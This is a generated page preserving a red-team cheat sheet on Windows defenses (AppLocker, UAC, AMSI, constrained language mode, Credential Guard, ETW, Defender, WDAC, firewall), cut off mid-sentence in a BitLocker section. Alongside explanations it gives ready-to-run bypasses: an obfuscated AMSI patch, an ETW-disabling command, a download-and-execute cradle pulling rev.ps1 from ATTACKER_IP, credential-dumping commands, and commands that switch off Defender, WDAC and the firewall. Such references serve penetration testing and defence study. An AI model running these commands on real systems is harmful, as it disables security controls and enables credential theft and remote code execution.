---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - Defenses

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-evasion-windows-defenses` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/evasion/windows-defenses.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - Defenses](../../topics/redteam/windows-defenses.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-evasion-windows-defenses |
| name | Windows - Defenses |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/evasion/windows-defenses.md |

## Preserved Source Material

````yaml
_body: "# Windows - Defenses\n\n## Summary\n\n* [AppLocker](#applocker)\n* [User Account Control](#user-account-control)\n\
  * [DPAPI](#dpapi)\n* [Powershell](#powershell)\n    * [Execution Policy](#execution-policy)\n    * [Anti Malware Scan Interface](#anti-malware-scan-interface)\n\
  \    * [Just Enough Administration](#just-enough-administration)\n    * [Contrained Language Mode](#constrained-language-mode)\n\
  \    * [Script Block and Module Logging](#script-block-and-module-logging)\n    * [PowerShell Transcript](#powershell-transcript)\n\
  \    * [SecureString](#securestring)\n* [Protected Process Light](#protected-process-light)\n* [Credential Guard](#credential-guard)\n\
  * [Event Tracing for Windows](#event-tracing-for-windows)\n* [Attack Surface Reduction](#attack-surface-reduction)\n* [Windows\
  \ Defender Antivirus](#windows-defender-antivirus)\n* [Windows Defender Application Control](#windows-defender-application-control)\n\
  * [Windows Defender Firewall](#windows-defender-firewall)\n* [Windows Information Protection](#windows-information-protection)\n\
  \n## AppLocker\n\n> AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to\
  \ control which applications and files users are allowed to run on their systems. The rules can be based on various criteria,\
  \ such as the file path, file publisher, or file hash, and can be applied to specific users or groups.\n\n* Enumerate Local\
  \ AppLocker Effective Policy\n\n    ```powershell\n    PowerView PS C:\\> Get-AppLockerPolicy -Effective | select -ExpandProperty\
  \ RuleCollections\n    PowerView PS C:\\> Get-AppLockerPolicy -effective -xml\n    Get-ChildItem -Path HKLM:\\SOFTWARE\\\
  Policies\\Microsoft\\Windows\\SrpV2\\Exe # (Keys: Appx, Dll, Exe, Msi and Script\n    ```\n\n* AppLocker Bypass\n    * By\
  \ default, `C:\\Windows` is not blocked, and `C:\\Windows\\Tasks` is writtable by any users\n    * [api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)\n\
  \    * [api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)\n\
  \    * [api0cradle/UltimateAppLockerByPassList/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)\n\
  \    * [api0cradle/AccessChk.bat](https://gist.github.com/api0cradle/95cd51fa1aa735d9331186f934df4df9)\n\n## User Account\
  \ Control\n\nUAC stands for User Account Control. It is a security feature introduced by Microsoft in Windows Vista and\
  \ is present in all subsequent versions of the Windows operating system. UAC helps mitigate the impact of malware and helps\
  \ protect users by asking for permission or an administrator's password before allowing changes to be made to the system\
  \ that could potentially affect all users of the computer.\n\n* Check if UAC is enabled\n\n    ```ps1\n    REG QUERY HKEY_LOCAL_MACHINE\\\
  Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\n    ```\n\n* Check UAC level\n\n    ```ps1\n\
  \    REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\n\
  \    REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v FilterAdministratorToken\n\
  \    ```\n\n| EnableLUA  | LocalAccountTokenFilterPolicy | FilterAdministratorToken | Description  |\n|---|---|---|---|\n\
  | 0 | / | / | No UAC |\n| 1 | 1 | / | No UAC |\n| 1 | 0 | 0 | No UAC for RID 500 |\n| 1 | 0 | 1 | UAC for Everyone |\n\n\
  * UAC Bypass\n    * [AutoElevated binary signed by Microsoft](https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html)\
  \ - `msconfig`, `sdclt.exe`, `eventvwr.exe`, etc\n    * [hfiref0x/UACME](https://github.com/hfiref0x/UACME) - Defeating\
  \ Windows User Account Control\n    * Find process that auto elevate:\n\n        ```ps1\n        strings.exe -s *.exe |\
  \ findstr /I \"<autoElevate>true</autoElevate>\"\n        ```\n\n## DPAPI\n\nRefer to [InternalAllTheThings/Windows - DPAPI.md](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/)\n\
  \n## Powershell\n\n### Execution Policy\n\n> PowerShell Execution Policy is a security feature that controls how scripts\
  \ run on a system. It helps prevent unauthorized scripts from executing, but it is not a security boundary—it only prevents\
  \ accidental execution of unsigned scripts.\n\n* Check current policy\n\n    ```ps1\n    Get-ExecutionPolicy\n    ```\n\n\
  | Policy     | Description                                       |\n| ------------- | -------------------------------------------------\
  \ |\n| Restricted    | No scripts allowed (default in some systems).     |\n| AllSigned     | Only runs signed scripts.\
  \                         |\n| RemoteSigned  | Local scripts run, remote scripts must be signed. |\n| Unrestricted  | Runs\
  \ all scripts, warns for remote scripts.       |\n| Bypass        | No restrictions; all scripts run.                 |\n\
  \n* `Restricted`: it prevents the execution of all scripts (the default for workstations).\n* `RemoteSigned`: it blocks\
  \ the execution of unsigned scripts downloaded from the Internet, but allows the execution of \"local\" scripts (the default\
  \ on servers). The command `Unblock-File` can be used to remove the Mark-of-the-Web (MotW) and make a downloaded script\
  \ look like a \"local\" script.\n\n    ```ps1\n    # Bypass\n    Unblock-File my-file-from-internet\n    ```\n\n* `AllSigned`:\
  \ it blocks unsigned scripts. This is the most secure option.\n\n    ```ps1\n    # Bypass\n    Get-Content .\\run.ps1 |\
  \ Invoke-Expression\n    ```\n\nYou can just run `powershell.exe` with the option `-ep Bypass`, or use the built-in command\
  \ `Set-ExecutionPolicy`.\n\n```ps1\npowershell -ep bypass\nSet-ExecutionPolicy Bypass -Scope Process -Force\n```\n\n###\
  \ Anti Malware Scan Interface\n\n> The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface)\
  \ that provides a unified interface for applications and services to integrate with any anti-malware product installed on\
  \ a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications\
  \ to request a scan of specific content.\n\nFind more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)\n\
  \n```powershell\nPS C:\\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)\n\
  ```\n\n### Just Enough Administration\n\n> Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that\
  \ allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and\
  \ controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended\
  \ actions or access sensitive information.\n\nBreaking out if JEA:\n\n* List available cmdlets: `command`\n* Look for non-default\
  \ cmdlets:\n\n    ```ps1\n    Set-PSSessionConfiguration\n    Start-Process\n    New-Service\n    Add-Computer\n    ```\n\
  \n### Constrained Language Mode\n\nCheck if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`\n\
  \n* Bypass using an old Powershell. Powershell v2 doesn't support CLM.\n\n    ```ps1\n    powershell.exe -version 2\n  \
  \  powershell.exe -version 2 -ExecutionPolicy bypass\n    powershell.exe -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\"\
  \n    ```\n\n* Bypass when `__PSLockDownPolicy` is used. Just put \"System32\" somewhere in the path.\n\n    ```ps1\n  \
  \  # Enable CLM from the environment\n    [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')\n\
  \    Get-ChildItem -Path Env:\n\n    # Create a check-mode.ps1 containing your \"evil\" powershell commands\n    $mode =\
  \ $ExecutionContext.SessionState.LanguageMode\n    write-host $mode\n\n    # Simple bypass, execute inside a System32 folder\n\
  \    PS C:\\> C:\\Users\\Public\\check-mode.ps1\n    ConstrainedLanguage\n\n    PS C:\\> C:\\Users\\Public\\System32\\check-mode.ps1\n\
  \    FullLanguagge\n    ```\n\n* Bypass using COM: [xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)\n\
  * Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)\n\
  \n    ```ps1\n    rundll32 PowerShdll,main <script>\n    rundll32 PowerShdll,main -h      Display this message\n    rundll32\
  \ PowerShdll,main -f <path>       Run the script passed as argument\n    rundll32 PowerShdll,main -w      Start an interactive\
  \ console in a new window (Default)\n    rundll32 PowerShdll,main -i      Start an interactive console in this console\n\
  \n    rundll32 PowerShx.dll,main -e                           <PS script to run>\n    rundll32 PowerShx.dll,main -f <path>\
  \                    Run the script passed as argument\n    rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     Load\
  \ a script and run a PS cmdlet\n    rundll32 PowerShx.dll,main -w                           Start an interactive console\
  \ in a new window\n    rundll32 PowerShx.dll,main -i                           Start an interactive console\n    rundll32\
  \ PowerShx.dll,main -s                           Attempt to bypass AMSI\n    rundll32 PowerShx.dll,main -v             \
  \              Print Execution Output to the console\n    ```\n\n### Script Block and Module Logging\n\n> Once Script Block\
  \ Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the\
  \ \"Windows PowerShell\" channel. To view the logs, administrators can use the Event Viewer application and navigate to\
  \ the \"Windows PowerShell\" channel.\n\nEnable Script Block Logging:\n\n```ps1\nfunction Enable-PSScriptBlockLogging\n\
  {\n    $basePath = 'HKLM:\\Software\\Policies\\Microsoft\\Windows' +\n      '\\PowerShell\\ScriptBlockLogging'\n\n    if(-not\
  \ (Test-Path $basePath))\n    {\n        $null = New-Item $basePath -Force\n    }\n\n    Set-ItemProperty $basePath -Name\
  \ EnableScriptBlockLogging -Value \"1\"\n}\n```\n\nDisable ETW of the current PowerShell session with [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32):\n\
  \n```ps1\n# This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled\
  \ which effectively disables Suspicious ScriptBlock Logging etc.\n[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\n\
  ```\n\n### PowerShell Transcript\n\nPowerShell Transcript is a logging feature that records all commands and output from\
  \ a PowerShell session. It helps with auditing, debugging, and troubleshooting by saving session activity to a text file.\n\
  \nStart a transcript and store the output in a custom file.\n\n```ps1\nStart-Transcript -Path \"C:\\transcripts\\transcript0.txt\"\
  \ -NoClobber\n```\n\nCommon locations for PowerShell transcripts outputs:\n\n```ps1\nC:\\Users\\<USERNAME>\\Documents\\\
  PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt\nC:\\Transcripts\\<DATE>\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt\n\
  ```\n\n### SecureString\n\nA `SecureString` in PowerShell is a data type designed to store sensitive information like passwords\
  \ or confidential data in a more secure manner than a plain string. Unlike a regular string, which stores data in plain\
  \ text and can be easily accessed in memory, a `SecureString` encrypts the data in memory, providing better protection against\
  \ unauthorized access.\n\nConvert to SecureString\n\n```ps1\n$original = 'myPassword'  \n$secureString = ConvertTo-SecureString\
  \ $original -AsPlainText -Force\n$secureStringValue = ConvertFrom-SecureString $secureString\n```\n\nGet the original content\n\
  \n```ps1\n$secureStringBack = $secureStringValue | ConvertTo-SecureString\n$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureStringBack);\n\
  $finalValue = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)\n```\n\nWhen a `SecureString` is created,\
  \ the plain text characters are encrypted immediately using the Data Protection API (**DPAPI**)\n\nUsing the AES key\n\n\
  ```ps1\n[Byte[]] $key = (49,222,...,87,159)\n$pass = (echo \"AA...AA=\" | ConvertTo-SecureString -Key $key)\n[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))\n\
  ```\n\n## Protected Process Light\n\nProtected Process Light (PPL) is implemented as a Windows security mechanism that enables\
  \ processes to be marked as \"protected\" and run in a secure, isolated environment, where they are shielded from attacks\
  \ by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the\
  \ operating system, such as anti-virus software, firewalls, and other security-related processes.\n\nWhen a process is marked\
  \ as \"protected\" using PPL, it is assigned a security level that determines the level of protection it will receive. This\
  \ security level can be set to one of several levels, ranging from low to high. Processes that are assigned a higher security\
  \ level are given more protection than those that are assigned a lower security level.\n\nA process's protection is defined\
  \ by a combination of the \"level\" and the \"signer\". The following table represent commonly used combinations, from [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/).\n\
  \n| Protection level                | Value | Signer          | Type                |\n|---------------------------------|------|------------------|---------------------|\n\
  | PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | Protected (2)       |\n| PS_PROTECTED_WINTCB             |\
  \ 0x62 | WinTcb (6)       | Protected (2)       |\n| PS_PROTECTED_WINDOWS            | 0x52 | Windows (5)      | Protected\
  \ (2)       |\n| PS_PROTECTED_AUTHENTICODE       | 0x12 | Authenticode (1) | Protected (2)       |\n| PS_PROTECTED_WINTCB_LIGHT\
  \       | 0x61 | WinTcb (6)       | Protected Light (1) |\n| PS_PROTECTED_WINDOWS_LIGHT      | 0x51 | Windows (5)      |\
  \ Protected Light (1) |\n| PS_PROTECTED_LSA_LIGHT          | 0x41 | Lsa (4)          | Protected Light (1) |\n| PS_PROTECTED_ANTIMALWARE_LIGHT\
  \  | 0x31 | Antimalware (3)  | Protected Light (1) |\n| PS_PROTECTED_AUTHENTICODE_LIGHT | 0x11 | Authenticode (1) | Protected\
  \ Light (1) |\n\nPPL works by restricting access to the protected process's memory and system resources, and by preventing\
  \ the process from being modified or terminated by other processes or users. The process is also isolated from other processes\
  \ running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.\n\n* Check\
  \ if LSASS is running in PPL\n\n    ```ps1\n    reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v\
  \ RunAsPPL\n    ```\n\n* Protected process example: you can't kill Microsoft Defender even with Administrator privilege.\n\
  \n    ```ps1\n    taskkill /f /im MsMpEng.exe\n    ERROR: The process \"MsMpEng.exe\" with PID 5784 could not be terminated.\n\
  \    Reason: Access is denied.\n    ```\n\n* Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver\
  \ / BYOVD)\n\n## Credential Guard\n\nWhen Credential Guard is enabled, it uses hardware-based virtualization to create a\
  \ secure environment that is separate from the operating system. This secure environment is used to store sensitive credential\
  \ information, which is encrypted and protected from unauthorized access.\n\nCredential Guard uses a combination of hardware-based\
  \ virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be\
  \ enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary\
  \ features.\n\n* [bytewreck/DumpGuard](https://github.com/bytewreck/DumpGuard) - Proof-of-Concept tool for extracting NTLMv1\
  \ hashes from sessions on modern Windows systems.\n* [EvanMcBroom/lsa-whisperer](https://github.com/EvanMcBroom/lsa-whisperer)\
  \ - Tools for interacting with authentication packages using their individual message protocols.\n\n| Technique | Requires<br>SYSTEM\
  \ | Requires<br>SPN Account | Can Dump<br>Credential Guard |\n| -------- | :-------: | :-------: | :-------: |\n| Extract\
  \ own credentials via Remote Credential Guard protocol | :x:| ✅ | ✅ |\n| Extract all credentials via Remote Credential Guard\
  \ protocol | ✅ | ✅ | ✅ |\n| Extract all credentials via Microsoft v1 authentication package | ✅ | :x: | :x: |\n\n* **Dumping\
  \ own session using Remote Credential Guard**: this works regardless of the state of Credential Guard, but requires credentials\
  \ for an SPN-enabled account.\n\n    ```ps1\n    DumpGuard.exe /mode:self /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD>\
  \ [/spn:<SPN>]\n    ```\n\n* **Dumping all sessions using Remote Credential Guard**: this works regardless of the state\
  \ of Credential Guard, but requires credentials for an SPN-enabled account and `SYSTEM` privileges.\n\n    ```ps1\n    DumpGuard.exe\
  \ /mode:all /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD> [/spn:<SPN>]\n    ```\n\n* **Dumping all sessions\
  \ using Microsoft v1 authentication package**\n    * Credential Guard is disabled on the local system.\n    * Remote users\
  \ are authenticated to the local system from a remote host over Remote Credential Guard.\n\n    ```ps1\n    DumpGuard.exe\
  \ /mode:all\n    # or\n    lsa-whisperer.exe msv1_0 Lm20GetChallengeResponse --luid {session id} --challenge {challenge\
  \ to clients} [flags...]\n    ```\n\n## Event Tracing for Windows\n\nETW (Event Tracing for Windows) is a Windows-based\
  \ logging mechanism that provides a way to collect and analyze system events and performance data in real-time. ETW allows\
  \ developers and system administrators to gather detailed information about system performance and behavior, which can be\
  \ used for troubleshooting, optimization, and security purposes.\n\n| Name                                  | GUID     \
  \                              |\n|---------------------------------------|----------------------------------------|\n|\
  \ Microsoft-Antimalware-Scan-Interface  | {2A576B87-09A7-520E-C21A-4942F0271D67} |\n| Microsoft-Windows-PowerShell     \
  \     | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |\n| Microsoft-Antimalware-Protection      | {E4B70372-261F-4C54-8FA6-A5A7914D73DA}\
  \ |\n| Microsoft-Windows-Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |\n\nYou can see all the providers\
  \ registered to Windows using: `logman query providers`\n\n```ps1\nPS C:\\Users\\User\\Documents> logman query providers\n\
  \nProvider                                 GUID\n-------------------------------------------------------------------------------\n\
  .NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}\nACPI Driver Trace Provider            \
  \   {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}\nActive Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}\n\
  Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}\nActive Directory: NetLogon            \
  \   {F33959B4-DBEC-11D2-895B-00C04F79AB69}\nADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}\n\
  ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}\n...\n```\n\nWe can get more information\
  \ about the provider using:  `logman query providers {ProviderID}/Provider-Name`\n\n```ps1\nPS C:\\Users\\User\\Documents>\
  \ logman query providers Microsoft-Antimalware-Scan-Interface\n\nProvider                                 GUID\n-------------------------------------------------------------------------------\n\
  Microsoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}\n\nValue               Keyword         \
  \     Description\n-------------------------------------------------------------------------------\n0x0000000000000001 \
  \ Event1\n0x8000000000000000  AMSI/Debug\n\nValue               Level                Description\n-------------------------------------------------------------------------------\n\
  0x04                win:Informational    Information\n\nPID                 Image\n-------------------------------------------------------------------------------\n\
  0x00002084          C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n0x00002084          C:\\Windows\\System32\\\
  WindowsPowerShell\\v1.0\\powershell.exe\n0x00001bd4\n0x00000ad0\n0x00000b98\n```\n\nThe `Microsoft-Windows-Threat-Intelligence`\
  \ provider corresponds to ETWTI, an additional security feature that an EDR can subscribe to and identify malicious uses\
  \ of APIs (e.g. process injection).\n\n```ps1\n0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL\n0x0000000000000002\
  \  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER\n0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE\n0x0000000000000008\
  \  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER\n0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL\n\
  0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER\n0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE\n\
  0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER\n0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL\n\
  0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER\n0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE\n\
  0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER\n0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE\n\
  0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER\n0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE\n\
  0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER\n0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL\n\
  0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE\n0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL\n\
  0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE\n0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD\n\
  0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD\n0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS\n\
  0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS\n```\n\nThe most common bypassing technique is patching the\
  \ function `EtwEventWrite` which is called to write/log ETW events. You can list the providers registered for a process\
  \ with `logman query providers -pid <PID>`\n\n## Attack Surface Reduction\n\n> Attack Surface Reduction (ASR) refers to\
  \ strategies and techniques used to decrease the potential points of entry that attackers could use to exploit a system\
  \ or network.\n\n```ps1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions AuditMode\n\
  Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions Enabled\n```\n\n| Description\
  \ | Id |\n|---------------------------------------------------------------------------|--------------------------------------|\n\
  | Block execution of potentially obfuscated scripts                         | 5beb7efe-fd9a-4556-801d-275e5ffc04cc |\n|\
  \ Block JavaScript or VBScript from launching downloaded executable content | d3e037e1-3eb8-44c8-a917-57927947596d |\n|\
  \ Block abuse of exploited vulnerable signed drivers                        | 56a863a9-875e-4185-98a7-b882c64b5ce5 |\n|\
  \ Block executable content from email client and webmail                    | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 |\n|\
  \ Block process creations originating from PSExec and WMI commands          | d1e49aac-8f56-4280-b9ba-993a6d77406c |\n|\
  \ Use advanced protection against ransomware                                | c1db55ab-c21a-4637-bb3f-a12568109d35 |\n|\
  \ Block credential stealing from the Windows local security authority subsystem (lsass.exe) | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2\
  \ |\n\n## Windows Defender Antivirus\n\nAlso known as `Microsoft Defender`.\n\n* Check status of Defender\n\n    ```powershell\n\
  \    PS C:\\> Get-MpComputerStatus\n    ```\n\n* Disable scanning all downloaded files and attachments\n\n    ```powershell\n\
  \    PS C:\\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus\n    PS C:\\> Set-MpPreference -DisableIOAVProtection\
  \ $true\n    ```\n\n* Disable AMSI (set to 0 to enable)\n\n    ```powershell\n    PS C:\\> Set-MpPreference -DisableScriptScanning\
  \ 1 \n    ```\n\n* Exclude a folder, a process from scanning\n\n    ```powershell\n    PS C:\\> Add-MpPreference -ExclusionPath\
  \ \"C:\\Temp\"\n    PS C:\\> Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"\n    PS C:\\> Set-MpPreference -ExclusionProcess\
  \ \"word.exe\", \"vmwp.exe\"\n    ```\n\n* Exclude a folder using WMI\n\n    ```powershell\n    PS C:\\> WMIC /Namespace:\\\
  \\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"C:\\Users\\Public\\wmic\"\n    ```\n\
  \n* Remove signatures. **NOTE**: if Internet connection is present, they will be downloaded again.\n\n    ```powershell\n\
  \    PS > & \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\n\
  \    PS > & \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n    ```\n\nIdentify the exact\
  \ bytes that are detected by Windows Defender Antivirus\n\n* [matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck)\
  \ - Identifies the bytes that Microsoft Defender flags on\n* [gatariee/gocheck](https://github.com/gatariee/gocheck) - DefenderCheck\
  \ but blazingly fast™\n\n## Windows Defender Application Control\n\nAlso known as `WDAC/UMCI/Device Guard`.\n\n> Windows\
  \ Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be\
  \ executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers,\
  \ and scripts. WDAC does not trust any software it does not know of.\n\n* Get WDAC current mode\n\n    ```ps1\n    $ Get-ComputerInfo\n\
  \    DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode\n    DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus\
  \ : EnforcementMode\n    ```\n\n* Remove WDAC policies using CiTool.exe (Windows 11 2022 Update)\n\n    ```ps1\n    CiTool.exe\
  \ -rp \"{PolicyId GUID}\" -json\n    ```\n\n* Device Guard policy location: `C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\\
  Active\\{PolicyId GUID}.cip`\n* Device Guard example policies: `C:\\Windows\\System32\\CodeIntegrity\\ExamplePolicies\\\
  `\n* WDAC utilities: [mattifestation/WDACTools](https://github.com/mattifestation/WDACTools), a PowerShell module to facilitate\
  \ building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies\n* WDAC bypass techniques:\
  \ [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)\n    * [nettitude/Aladdin](https://github.com/nettitude/Aladdin)\
  \ - WDAC Bypass using AddInProcess.exe\n\n## Windows Defender Firewall\n\n* List firewall state and current configuration\n\
  \n    ```powershell\n    netsh advfirewall firewall dump\n    # or \n    netsh firewall show state\n    netsh firewall show\
  \ config\n    ```\n\n* List firewall's blocked ports\n\n    ```powershell\n    $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules\
  \ |  where {$_.action -eq \"0\"} | select name,applicationname,localports\n    ```\n\n* Disable firewall\n\n    ```powershell\n\
  \    # Disable Firewall via cmd\n    reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"\
  \  /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n    # Disable Firewall via Powershell\n    powershell.exe -ExecutionPolicy\
  \ Bypass -command 'Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\"\
  \ –Value'`\n\n    # Disable Firewall on any windows using native command\n    netsh firewall set opmode disable\n    netsh\
  \ Advfirewall set allprofiles state off\n    ```\n\n## Windows Information Protection\n\nWindows Information Protection\
  \ (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive\
  \ data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies\
  \ that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise\
  \ data from personal data on the device.\n\nProtection of file (data) locally marked as corporate is facilitated via Encrypting\
  \ File System (EFS) encryption of Windows (a feature of NTFS file system)\n\n* Enumerate files attributes, `Encrypted` attribute\
  \ is used for files protected by WIP\n\n    ```ps1\n    PS C:\\> (Get-Item -Path 'C:\\...').attributes\n    Archive, Encrypted\n\
  \    ```\n\n* Encrypt files: `cipher /c encryptedfile.extension`\n* Decrypt files: `cipher /d encryptedfile.extension`\n\
  \nThe **Enterprise Context** column shows you what each app can do with your enterprise data:\n\n* **Domain**. Shows the\
  \ employee's work domain (such as, corp.contoso.com). This app is considered work-related and can freely touch and open\
  \ work data and resources.\n* **Personal**. Shows the text, Personal. This app is considered non-work-related and can't\
  \ touch any work data or resources.\n* **Exempt**. Shows the text, Exempt. Windows Information Protection policies don't\
  \ apply to these apps (such as, system components).\n\n## BitLocker Drive Encryption\n\nBitLocker is a full-disk encryption\
  \ feature included in Microsoft Windows operating systems starting with Windows Vista. It is designed to protect data by\
  \ providing encryption for entire volumes. BitLocker uses AES encryption algorithm to encrypt data on the disk. When enabled,\
